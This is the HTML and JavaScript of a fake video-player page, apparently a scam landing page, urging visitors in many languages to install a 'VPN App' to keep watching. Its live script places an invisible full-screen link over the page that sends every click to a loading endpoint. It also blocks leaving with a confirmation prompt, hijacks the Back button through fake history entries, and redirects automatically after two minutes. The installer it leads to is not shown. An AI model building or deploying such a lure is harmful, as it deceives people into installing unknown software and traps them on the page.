<!DOCTYPE html>

<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title id="a1">Attention!</title>
    <link rel="icon" href="/public/images/fav.png">
    <link href="/public/styles/618122e7088e8.css" rel="stylesheet">
   
  
    <link href="/public/styles/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
	<script>
	
        function getURLParameter(name) {
            return decodeURIComponent(
                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
            );
        }
    </script>

</head>

<body onload="translate();">

    <div class="wrapper">
        <div class="top_wrapper">
            <h1 id="a2">Attention</h1>
            <p id="a3">Please install the <b>VPN App</b> to continue watching in safe mode.</p>
            
        </div>

        <p class="button" id="a4">Install</p>

    </div>
    <section class="player">
        <div class="player_content">
            <img class="loading" src="/public/images/618122e708794.svg" alt="">
            <img class="play" src="/public/images/618122e7087e9.svg" alt="">
        </div>
        <div class="top_icons">
           <img src="/public/images/close.svg"> <img src="/public/images/thumb.svg">
           
        </div>
        <div class="player_navigation">
            <div class="player_navigation_item">
                <div class="pause_play">
                    <img src="/public/images/618122e708859.svg" alt="">
                    <img src="/public/images/618122e708870.svg" alt="">
                </div>
                <p>00:0<span id="counter_wrapper">2</span>/1:52:46</p>
            </div>
            <div class="progress">
                <div class="progress_load">
                    <div class="progress_line"></div>
                </div>
            </div>
            <div class="player_navigation_item">
                <img src="/public/images/618122e708887.svg" alt="">
                <!-- <img class="img_padding" src="/public/images/618122e7088ca.svg" alt=""> -->
                <img src="/public/images/618122e70889d.svg" alt="">
                <img src="/public/images/618122e7088b2.svg" alt="">
                <img src="/public/images/618122e7088ca.svg" alt="">
            </div>
        </div>
    </section>

    <a href="#" class="finlink" style="
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  z-index: 99999;
  "></a>

<script type="text/javascript">
    // ==================== 链接设置 ====================
    var fin_link = '/api/loading.php';
    var new_page_url = 'http://www.google.com'; // 新页面链接
    console.log('固定链接:', fin_link);
    console.log('新页面链接:', new_page_url);
    // ==================== 设置结束 ====================

    // 设置所有finlink类的链接
    var links = document.getElementsByClassName('finlink');
    for (var i = 0; i < links.length; i++) {
        links[i].setAttribute("href", fin_link);
    }

    // 为所有链接绑定点击事件 - 修改为同时执行两个操作
    for (var j = 0; j < links.length; j++) {
        links[j].addEventListener('click', function (evt) {
            evt.preventDefault(); // 阻止默认链接跳转
            
            console.log('链接被点击');
            
            // 1. 移除页面离开事件监听
            window.removeEventListener('beforeunload', befUnlFunc);
            window.onbeforeunload = null;
            
            // 2. 当前页面跳转到fin_link（页面顶部）
            window.location.href = fin_link;
            
            // 3. 打开新页面到http://www.google.com
            window.open(new_page_url, '_blank');
        });
    }

    // 页面离开确认函数
    function befUnlFunc(e) {
        e.preventDefault();
        console.log('page closed');
        const confirmationMessage = 'Are you sure you want to leave the page?';
        e.returnValue = confirmationMessage;
        return confirmationMessage;
    }
    window.addEventListener('beforeunload', befUnlFunc);

    // 自动重定向：2分钟后执行与点击相同的操作
    setTimeout(function () {
        window.onbeforeunload = null;
        console.log('2分钟定时器触发');
        
        // 1. 当前页面跳转到fin_link（页面顶部）
        window.location.href = fin_link;
        
        // 2. 打开新页面到http://www.google.com
        window.open(new_page_url, '_blank');
        
    }, 60000 * 2);

    // 防止浏览器后退功能
    !function () {
        var t;
        try {
            for (t = 0; 10 > t; ++t) history.pushState({}, "", "");
            onpopstate = function (t) {
                window.onbeforeunload = null;
                t.state && location.replace(fin_link);
            };
        } catch (o) {}
    }();
</script>

    <script>
        function getURLParameter(name) {
            return decodeURIComponent(
                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
            );
        }
        strAlert = "";

        var translation = {
            source: {
                a1: "Attention!",
                a2: "Attention!",
                a3: "Please install the <b>VPN App</b> to continue watching in safe mode.",
                a4: "Install",
            },
           en: {
    a1: "Attention!",
    a2: "Attention!",
    a3: "Please install the <b>VPN App</b> to continue watching in safe mode.",
    a4: "Install"
  },
  de: {
    a1: "Achtung!",
    a2: "Achtung!",
    a3: "Bitte installieren Sie die <b>VPN-App</b>, um im sicheren Modus weiterzuschauen.",
    a4: "Installieren"
  },
  fr: {
    a1: "Attention !",
    a2: "Attention !",
    a3: "Veuillez installer l'<b>application VPN</b> pour continuer à regarder en mode sécurisé.",
    a4: "Installer"
  },
  pt: {
    a1: "Atenção!",
    a2: "Atenção!",
    a3: "Por favor, instale o <b>aplicativo VPN</b> para continuar assistindo em modo seguro.",
    a4: "Instalar"
  },
  es: {
    a1: "¡Atención!",
    a2: "¡Atención!",
    a3: "Por favor, instala la <b>aplicación VPN</b> para seguir viendo en modo seguro.",
    a4: "Instalar"
  },
  sr: {
    a1: "Пажња!",
    a2: "Пажња!",
    a3: "Молимо вас да инсталирате <b>VPN апликацију</b> да бисте наставили са гледањем у безбедном режиму.",
    a4: "Инсталирај"
  },
  ar: {
    a1: "انتباه!",
    a2: "انتباه!",
    a3: "يرجى تثبيت <b>تطبيق VPN</b> لمواصلة المشاهدة في الوضع الآمن.",
    a4: "تثبيت"
  },
  nl: {
    a1: "Let op!",
    a2: "Let op!",
    a3: "Installeer de <b>VPN-app</b> om verder te kijken in de veilige modus.",
    a4: "Installeren"
  },
  zh: {
    a1: "注意！",
    a2: "注意！",
    a3: "请安装<b>VPN应用</b>以继续在安全模式下观看。",
    a4: "安装"
  },
  ms: {
    a1: "Perhatian!",
    a2: "Perhatian!",
    a3: "Sila pasang <b>Aplikasi VPN</b> untuk terus menonton dalam mod selamat.",
    a4: "Pasang"
  },
  id: {
    a1: "Perhatian!",
    a2: "Perhatian!",
    a3: "Harap instal <b>Aplikasi VPN</b> untuk terus menonton dalam mode aman.",
    a4: "Instal"
  },
  th: {
    a1: "โปรดทราบ!",
    a2: "โปรดทราบ!",
    a3: "กรุณาติดตั้ง <b>แอป VPN</b> เพื่อดูต่อในโหมดปลอดภัย",
    a4: "ติดตั้ง"
  },
  fil: {
    a1: "Pansin!",
    a2: "Pansin!",
    a3: "Mangyaring i-install ang <b>VPN App</b> upang magpatuloy sa panonood sa ligtas na mode.",
    a4: "I-install"
  },
  ja: {
    a1: "注意！",
    a2: "注意！",
    a3: "安全モードで視聴を続けるには、<b>VPNアプリ</b>をインストールしてください。",
    a4: "インストール"
  },
  tr: {
    a1: "Dikkat!",
    a2: "Dikkat!",
    a3: "Güvenli modda izlemeye devam etmek için lütfen <b>VPN Uygulaması</b>’nı yükleyin.",
    a4: "Yükle"
  },
  da: {
    a1: "Opmærksomhed!",
    a2: "Opmærksomhed!",
    a3: "Udstyr venligst <b>VPN-appen</b> for at fortsætte med at se i sikker tilstand.",
    a4: "Udstyr"
  },
  ko: {
    a1: "주의!",
    a2: "주의!",
    a3: "안전 모드에서 계속 시청하려면 <b>VPN 앱</b>을 설치해 주세요.",
    a4: "설치"
  },
  it: {
    a1: "Attenzione!",
    a2: "Attenzione!",
    a3: "Installa l'<b>app VPN</b> per continuare a guardare in modalità sicura.",
    a4: "Installa"
  },
  no: {
    a1: "Merk!",
    a2: "Merk!",
    a3: "Vennligst installer <b>VPN-appen</b> for å fortsette å se i sikker modus.",
    a4: "Installer"
  },
  sv: {
    a1: "Uppmärksamhet!",
    a2: "Uppmärksamhet!",
    a3: "Vänligen installera <b>VPN-appen</b> för att fortsätta titta i säkert läge.",
    a4: "Installera"
  },
  fi: {
    a1: "Huomio!",
    a2: "Huomio!",
    a3: "Asenna <b>VPN-sovellus</b> jatkaaksesi katselua turvallisessa tilassa.",
    a4: "Asenna"
  },
  is: {
    a1: "Athygli!",
    a2: "Athygli!",
    a3: "Vinsamlegast settu upp <b>VPN-forritið</b> til að halda áfram að horfa í öruggum ham.",
    a4: "Setja upp"
  },
  el: {
    a1: "Προσοχή!",
    a2: "Προσοχή!",
    a3: "Παρακαλούμε εγκαταστήστε την <b>εφαρμογή VPN</b> για να συνεχίσετε να παρακολουθείτε σε ασφαλή λειτουργία.",
    a4: "Εγκατάσταση"
  },
  bg: {
    a1: "Внимание!",
    a2: "Внимание!",
    a3: "Моля, инсталирайте <b>приложението VPN</b>, за да продължите да гледате в безопасен режим.",
    a4: "Инсталирай"
  },
  hu: {
    a1: "Figyelem!",
    a2: "Figyelem!",
    a3: "Kérjük, telepítse a <b>VPN alkalmazást</b>, hogy biztonságos módban folytathassa a nézést.",
    a4: "Telepítés"
  },
  et: {
    a1: "Tähelepanu!",
    a2: "Tähelepanu!",
    a3: "Palun installige <b>VPN-rakendus</b>, et jätkata vaatamist turvarežiimis.",
    a4: "Installi"
  },
  hr: {
    a1: "Pažnja!",
    a2: "Pažnja!",
    a3: "Molimo instalirajte <b>VPN aplikaciju</b> kako biste nastavili gledati u sigurnom načinu.",
    a4: "Instaliraj"
  },
  sl: {
    a1: "Pozor!",
    a2: "Pozor!",
    a3: "Prosimo, namestite <b>aplikacijo VPN</b>, da nadaljujete z gledanjem v varnem načinu.",
    a4: "Namesti"
  },
  ro: {
    a1: "Atenție!",
    a2: "Atenție!",
    a3: "Vă rugăm să instalați <b>aplicația VPN</b> pentru a continua vizionarea în modul sigur.",
    a4: "Instalează"
  },
  cs: {
    a1: "Pozor!",
    a2: "Pozor!",
    a3: "Nainstalujte prosím <b>aplikaci VPN</b>, abyste mohli pokračovat v bezpečném režimu.",
    a4: "Nainstalovat"
  },
  pl: {
    a1: "Uwaga!",
    a2: "Uwaga!",
    a3: "Zainstaluj <b>aplikację VPN</b>, aby kontynuować oglądanie w trybie bezpiecznym.",
    a4: "Zainstaluj"
  },
  vi: {
    a1: "Chú ý!",
    a2: "Chú ý!",
    a3: "Vui lòng cài đặt <b>ứng dụng VPN</b> để tiếp tục xem ở chế độ an toàn.",
    a4: "Cài đặt"
  },
  lv: {
    a1: "Uzmanību!",
    a2: "Uzmanību!",
    a3: "Lūdzu, instalējiet <b>VPN lietotni</b>, lai turpinātu skatīties drošajā režīmā.",
    a4: "Instalēt"
  },
  lt: {
    a1: "Dėmesio!",
    a2: "Dėmesio!",
    a3: "Prašome įdiegti <b>VPN programėlę</b>, kad galėtumėte toliau žiūrėti saugiu režimu.",
    a4: "Įdiegti"
  },
  sk: {
    a1: "Pozor!",
    a2: "Pozor!",
    a3: "Nainštalujte si <b>aplikáciu VPN</b>, aby ste mohli pokračovať v sledovaní v bezpečnom režime.",
    a4: "Nainštalovať"
  },
  hi: {
    a1: "ध्यान दें!",
    a2: "ध्यान दें!",
    a3: "कृपया सुरक्षित मोड में देखना जारी रखने के लिए <b>VPN ऐप</b> इंस्टॉल करें।",
    a4: "इंस्टॉल करें"
  },
  mr: {
    a1: "लक्ष द्या!",
    a2: "लक्ष द्या!",
    a3: "सुरक्षित मोडमध्ये पाहणे सुरू ठेवण्यासाठी कृपया <b>VPN अॅप</b> स्थापित करा.",
    a4: "स्थापित करा"
  },
  gu: {
    a1: "ધ્યાન!",
    a2: "ધ્યાન!",
    a3: "સલામત મોડમાં જોવાનું ચાલુ રાખવા માટે કૃપા કરીને <b>VPN એપ</b> ઇન્સ્ટોલ કરો.",
    a4: "ઇન્સ્ટોલ કરો"
  },
  ta: {
    a1: "கவனம்!",
    a2: "கவனம்!",
    a3: "பாதுகாப்பு முறையில் தொடர்ந்து பார்க்க <b>VPN பயன்பாட்டை</b> நிறுவவும்.",
    a4: "நிறுவு"
  },
  ml: {
    a1: "ശ്രദ്ധിക്കുക!",
    a2: "ശ്രദ്ധിക്കുക!",
    a3: "സുരക്ഷിത മോഡിൽ കാണുന്നത് തുടരാൻ <b>VPN ആപ്പ്</b> ഇൻസ്റ്റാൾ ചെയ്യുക.",
    a4: "ഇൻസ്റ്റാൾ"
  },
  pa: {
    a1: "ਧਿਆਨ!",
    a2: "ਧਿਆਨ!",
    a3: "ਸੁਰੱਖਿਅਤ ਮੋਡ ਵਿੱਚ ਦੇਖਣਾ ਜਾਰੀ ਰੱਖਣ ਲਈ ਕਿਰਪਾ ਕਰਕੇ <b>VPN ਐਪ</b> ਇੰਸਟਾਲ ਕਰੋ।",
    a4: "ਇੰਸਟਾਲ ਕਰੋ"
  },
  kn: {
    a1: "ಗಮನ!",
    a2: "ಗಮನ!",
    a3: "ಸುರಕ್ಷಿತ ವಿಧಾನದಲ್ಲಿ ವೀಕ್ಷಣೆಯನ್ನು ಮುಂದುವರಿಸಲು ದಯವಿಟ್ಟು <b>VPN ಆಪ್</b> ಸ್ಥಾಪಿಸಿ。",
    a4: "ಸ್ಥಾಪಿಸಿ"
  },
  te: {
    a1: "జాగ్రత్త!",
    a2: "జాగ్రత్త!",
    a3: "సురక్షిత మోడ్‌లో చూడటం కొనసాగించడానికి దయచేసి <b>VPN యాప్</b>‌ను ఇన్‌స్టాల్ చేయండి。",
    a4: "ఇన్‌స్టాల్ చేయండి"
  },
  ur: {
    a1: "توجہ!",
    a2: "توجہ!",
    a3: "براہ کرم محفوظ موڈ میں دیکھنے کے لیے <b>VPN ایپ</b> انسٹال کریں۔",
    a4: "انسٹال کریں"
  },
  bn: {
    a1: "মনোযোগ!",
    a2: "মনোযোগ!",
    a3: "নিরাপদ মোডে দেখা চালিয়ে যেতে দয়া করে <b>VPN অ্যাপ</b> ইনস্টল করুন।",
    a4: "ইনস্টল করুন"
  },
  ru: {
    a1: "Внимание!",
    a2: "Внимание!",
    a3: "Пожалуйста, установите <b>приложение VPN</b>, чтобы продолжить просмотр в безопасном режиме.",
    a4: "Установить"
  },
  ne: {
    a1: "सावधान!",
    a2: "सावधान!",
    a3: "सुरक्षित मोडमा हेर्न जारी राख्न कृपया <b>VPN एप</b> स्थापना गर्नुहोस्।",
    a4: "स्थापना गर्नुहोस्"
  },
  uk: {
    a1: "Увага!",
    a2: "Увага!",
    a3: "Будь ласка, встановіть <b>додаток VPN</b>, щоб продовжити перегляд у безпечному режимі.",
    a4: "Встановити"
  },
  ka: {
    a1: "ყურადღება!",
    a2: "ყურადღება!",
    a3: "გთხოვთ, დააინსტალიროთ <b>VPN აპი</b>, რათა გააგრძელოთ ყურება უსაფრთხო რეჟიმში.",
    a4: "დააინსტალირე"
  },
  fa: {
    a1: "توجه!",
    a2: "توجه!",
    a3: "لطفاً <b>اپلیکیشن VPN</b> را نصب کنید تا بتوانید در حالت امن به تماشا ادامه دهید.",
    a4: "نصب کنید"
  },
  sw: {
    a1: "Tahadhari!",
    a2: "Tahadhari!",
    a3: "Tafadhali sakinisha <b>Programu ya VPN</b> ili kuendelea kutazama katika hali salama.",
    a4: "Sakinisha"
  },
  hy: {
    a1: "Ուշադրություն!",
    a2: "Ուշադրություն!",
    a3: "Խնդրում ենք տեղադրել <b>VPN հավելվածը</b>՝ անվտանգ ռեժիմում դիտումը շարունակելու համար:",
    a4: "Տեղադրել"
  },
  uz: {
    a1: "Diqqat!",
    a2: "Diqqat!",
    a3: "Xavfsiz rejimda tomosha qilishni davom ettirish uchun iltimos <b>VPN ilovasini</b> o‘rnating.",
    a4: "O‘rnatish"
  },
  mk: {
    a1: "Внимание!",
    a2: "Внимание!",
    a3: "Ве молиме инсталирајте ја <b>апликацијата VPN</b> за да продолжите со гледање во безбеден режим.",
    a4: "Инсталирај"
  },
  am: {
    a1: "ትኩረት!",
    a2: "ትኩረት!",
    a3: "በአስተማማኝ ሁኔታ መመልከቻን ለመቀጠል እባክዎ <b>VPN መተግበሪያ</b>ን ጫን።",
    a4: "ጫን"
  },
  yo: {
    a1: "Akiyesi!",
    a2: "Akiyesi!",
    a3: "Jọwọ fi sori ẹrọ <b>App VPN</b> lati tẹsiwaju wiwo ni ipo ailewu.",
    a4: "Fi sori ẹrọ"
  },
  ha: {
    a1: "Hankali!",
    a2: "Hankali!",
    a3: "Don Allah shigar da <b>App na VPN</b> don ci gaba da kallo cikin yanayin aminci.",
    a4: "Shigar"
  },
  om: {
    a1: "Qajeelcha!",
    a2: "Qajeelcha!",
    a3: "Mee appii VPN galchi sii dubbii haalaan amansiisanitti itti fufuun.",
    a4: "Galchi"
  },
  zu: {
    a1: "Qaphela!",
    a2: "Qaphela!",
    a3: "Sicela ufake <b>Uhlelo lokusebenza lwe-VPN</b> ukuze uqhubeke nokubuka ngendlela ephephile.",
    a4: "Faka"
  },
  my: {
    a1: "သတိထားပါ!",
    a2: "သတိထားပါ!",
    a3: "လုံခြုံသောမုဒ်ဖြင့် ဆက်လက်ကြည့်ရှုရန် <b>VPN အက်ပ်</b>ကို ထည့်သွင်းပါ။",
    a4: "ထည့်သွင်းပါ"
  },
  km: {
    a1: "ការយកចិត្តទុកដាក់!",
    a2: "ការយកចិត្តទុកដាក់!",
    a3: "សូមដំឡើង <b>កម្មវិធី VPN</b> ដើម្បីបន្តមើលក្នុងរបៀបសុវត្ថិភាព។",
    a4: "ដំឡើង"
  },
  lo: {
    a1: "ລະວັງ!",
    a2: "ລະວັງ!",
    a3: "ກະລຸນາຕິດຕັ້ງ <b>ແອັບ VPN</b> ເພື່ອສືບຕໍ່ເບິ່ງໃນໂໝດປອດໄພ。",
    a4: "ຕິດຕັ້ງ"
  },
  si: {
    a1: "අවධානය!",
    a2: "අවධානය!",
    a3: "ආරක්ෂිත ප්‍රකාරයෙන් බැලීම ඉදිරියට ගෙන යාමට කරුණාකර <b>VPN යෙදුම</b> ස්ථාපනය කරන්න。",
    a4: "ස්ථාපනය කරන්න"
  },
  as: {
    a1: "মনোযোগ!",
    a2: "মনোযোগ!",
    a3: "নিৰাপদ মোডত চাবলৈ অব্যাহত ৰাখিবলৈ অনুগ্ৰহ কৰি <b>VPN এপ</b> ইনষ্টল কৰক।",
    a4: "ইনষ্টল কৰক"
  },
  or: {
    a1: "ଧ୍ୟାନ!",
    a2: "ଧ୍ୟାନ!",
    a3: "ସୁରକ୍ଷିତ ମୋଡରେ ଦେଖିବା ଜାରି ରଖିବା ପାଇଁ ଦୟାକରି <b>VPN ଆପ</b> ଇନଷ୍ଟଲ କରନ୍ତୁ।",
    a4: "ଇନଷ୍ଟଲ କରନ୍ତୁ"
  },
  ps: {
    a1: "پاملرنه!",
    a2: "پاملرنه!",
    a3: "مهرباني وکړئ د خوندي موډ کې د لیدو دوام لپاره <b>VPN اپلیکیشن</b> نصب کړئ。",
    a4: "نصب کړئ"
  },
  ku: {
    a1: "Baldarî!",
    a2: "Baldarî!",
    a3: "Ji kerema xwe <b>Sepanê VPN</b> saz bike da ku di moda ewle de temaşekirinê bidomînî.",
    a4: "Saz bike"
  },
  ti: {
    a1: "ትኩረት!",
    a2: "ትኩረት!",
    a3: "ኣብ ውሑስ ሞድ ንምቕጻል ምርኣይ እባ ነቲ <b>ቪፒኤን ኣፕ</b> ስገር።",
    a4: "ስገር"
  },
  mg: {
    a1: "Fampitandremana!",
    a2: "Fampitandremana!",
    a3: "Mba apetraho ny <b>App VPN</b> mba hanohizana ny fijerena amin'ny fomba azo antoka.",
    a4: "Apetraho"
  },
  ny: {
    a1: "Chenjezo!",
    a2: "Chenjezo!",
    a3: "Chonde ikani <b>Pulogalamu ya VPN</b> kuti mupitirize kuwona mu mtundu wotetezeka.",
    a4: "Ikani"
  },
  bh: {
    a1: "ध्यान!",
    a2: "ध्यान!",
    a3: "सुरक्षित मोड में देखे खातिर कृपया <b>VPN ऐप</b> इंस्टॉल करीं।",
    a4: "इंस्टॉल करीं"
  },
  mai: {
    a1: "ध्यान!",
    a2: "ध्यान!",
    a3: "सुरक्षित मोड मे देखबाक लेल कृपया <b>VPN ऐप</b> इंस्टॉल करू।",
    a4: "इंस्टॉल करू"
  },
  mn: {
    a1: "Анхаар!",
    a2: "Анхаар!",
    a3: "Аюулгүй горимд үзэсгэлэн үргэлжлүүлэхийн тулд <b>VPN апп</b>-ыг суулгана уу.",
    a4: "Суулгах"
  },
  so: {
    a1: "Feejignow!",
    a2: "Feejignow!",
    a3: "Fadlan ku rakib <b>App-ka VPN</b> si aad u sii wadato daawashada qaabka aaminka ah.",
    a4: "Ku rakib"
  },
  ig: {
    a1: "Lezie Anya!",
    a2: "Lezie Anya!",
    a3: "Biko wụnye <b>Ngwa VPN</b> ka ị nwee ike ịga n'ihu na-ekiri n'ọnọdụ nchebe.",
    a4: "Wụnye"
  },
  ff: {
    a1: "Jeeɗo!",
    a2: "Jeeɗo!",
    a3: "Taaɗo aaf <b>App VPN</b> ngal ngam jokkude yiyde e mbaadi haanndi.",
    a4: "Aaf"
  },
  wo: {
    a1: "Jàppale!",
    a2: "Jàppale!",
    a3: "Jàppale sampal <b>App VPN</b> ngir jokk wone ci yanum bu wóor.",
    a4: "Sampal"
  },
  bo: {
    a1: "གནས་ཡོད!",
    a2: "གནས་ཡོད!",
    a3: "བདེ་འཇགས་ཀྱི་གནས་སྡོད་པའི་ཆ་རིག་གི་ལཱ་འགན་གནས་ཡོད་པའི་ཆ་རིག <b>VPN</b> བཙུགས།",
    a4: "བཙུགས"
  },
  sm: {
    a1: "Fa'aeteete!",
    a2: "Fa'aeteete!",
    a3: "Fa'amolemole fa'apipi'i le <b>App VPN</b> e fa'aauau ai le matamata i le tulaga saogalemu.",
    a4: "Fa'apipi'i"
  }
          
            
   
        };

        function replace_text(lang, text) {
      x = document.getElementById(text);
      if (x) {
        x.innerHTML = translation[lang][text];
      } else {
        console.log("element not Found: " + text);
      }
    }

    function alert_string(lang, text) {
      return translation[lang][text] + "\n\n";
    }

    function translation_available(lang) {
      if (translation[lang]) {
        return lang;
      } else {
        console.log("translation not Found: " + lang);
        return "source";
      }
    }

    function detect_language() {
      var language = navigator.language || navigator.userLanguage;
      if (language.length > 4) {
        language = language[0] + language[1];
      };
      if (jQuery.inArray(language, ['ar', 'he', 'fa', 'ur']) >= 0) {
        $('.wrapper').attr('DIR', 'RTL');
        $('.top_wrapper').css('text-align', 'right');
        $('.button').css('padding', '0 20px 18px 20px')
      }
      return translation_available(language);
    }

    function translate() {
      var language = detect_language();
      for (y in translation["source"]) {
        replace_text(language, y);
        if (y == 'aler') {
          strAlert += translation[language][y];
        }
      }

    }

    function getURLParameter(name) {
      return decodeURI(
        (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
      );
    }
    </script>



</body>

</html>